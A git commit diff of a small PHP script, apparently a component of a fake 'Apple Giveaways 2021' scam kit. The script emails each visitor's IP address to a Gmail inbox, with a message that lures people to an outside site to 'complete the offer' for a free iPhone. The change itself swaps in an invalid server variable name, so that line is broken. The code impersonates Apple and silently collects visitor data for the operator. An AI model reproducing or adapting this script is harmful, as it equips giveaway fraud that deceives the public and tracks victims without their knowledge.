a83cea0fbe3331244f885a79734c12ce4840812f
firasdris54487 <61518027+firasdris54487@users.noreply.github.com>
2021-07-20 04:23:03 +0200

    Update Firasdris_Bot.php

--- Firasdris_Bot.php
+++ Firasdris_Bot.php
@@ -1,6 +1,6 @@
 <?php
 $tujuanmail = 'user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com,user54487215@gmail.com';
-$x_path = "Apple Giveaways 2021" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
+$x_path = "Apple Giveaways 2021" . $_SERVER['Apple Giveaways Worldwide'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "To Get New Brand IPhone 11 PRO You Have To Viste https://jarba.com.mx And Complete The Offer : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "Giveaways By Aplle IPhone 11 Pro 2021 Worldwide", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
 ?>
